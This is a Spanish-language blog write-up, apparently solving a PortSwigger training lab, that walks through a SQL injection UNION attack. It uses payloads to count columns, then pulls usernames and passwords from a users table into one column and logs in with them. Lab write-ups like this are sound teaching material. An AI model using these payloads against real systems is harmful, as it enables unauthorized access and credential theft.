---
title: PortSwigger - SQL injection UNION attack, retrieving multiple values in a single column.
layout: post
post-image: /assets/images/gatohacker4.jpg 
description: La resolución del reto SQL injection UNION attack, retrieving multiple values in a single column. 
tags:
- portswigger
- sqli
- post
- writeups
---
# Solución
---

Primero hacemos click en **Gifts** o en cualquier filtro de búsqueda.

![](/images/images-portswigger-sqli/lab6-1.png)

Veremos que se agrega una cadena que es vulnerable a SQL injection.

![](/images/images-portswigger-sqli/lab6-2.png)

Empezamos enumerando la cantidad de columnas.

```sql
' UNION SELECT null -- -
```

![](/images/images-portswigger-sqli/lab6-3.png)

Escribimos dos `null` y comprobamos que existen 2 columnas.

```sql
' UNION SELECT null,null -- -
```

![](/images/images-portswigger-sqli/lab6-4.png)

Ahora verificamo si ambas columnas aceptan un string y nos damos cuenta que la primera columna no acepta un string.

```sql
' UNION SELECT 'a',null -- -
```

![](/images/images-portswigger-sqli/lab6-5.png)

Probamos con el segundo null y comprobamos que sí acepta strings.

```sql
' UNION SELECT null,'a' -- -
```

![](/images/images-portswigger-sqli/lab6-6.png)

Podemos enumerar uno a uno las columnas para obtener los nombres de usuario y contraseñas.

```sql
' UNION SELECT null,username from users -- -
```

![](/images/images-portswigger-sqli/lab6-7.png)

```sql
' UNION SELECT null,password from users -- -
```

![](/images/images-portswigger-sqli/lab6-8.png)

Pero la idea del laboratorio es practicar una forma de obtener las dol columnas en una sola query. Para eso podemos usar el símbolo `||` que sirve para unir dos columnas en  SQL.

```sql
' UNION SELECT null,password||username from users -- -
```

![](/images/images-portswigger-sqli/lab6-9.png)

Podemos separar de mejor forma las dos columnas agregando un símbolo entre las dos columnas. Separaremos ambas columnas con: `||':'||`.

```sql
' UNION SELECT null,password||':'||username from users -- -
```

![](/images/images-portswigger-sqli/lab6-10.png)

Con esta información vamos a **My account**.

![](/images/images-portswigger-sqli/lab6-11.png)

Iniciamos sesión con las credenciales que obtuvimos anteriormente.

![](/images/images-portswigger-sqli/lab6-12.png)

Y resolvemos el lab.

![](/images/images-portswigger-sqli/lab6-13.png)


---

## [Anterior](/sql-injection-union-attack-retrieving-data-from-other-tables)
## [Siguiente](/sql-injection-attack-querying-the-database-type-and-version-on-oracle)
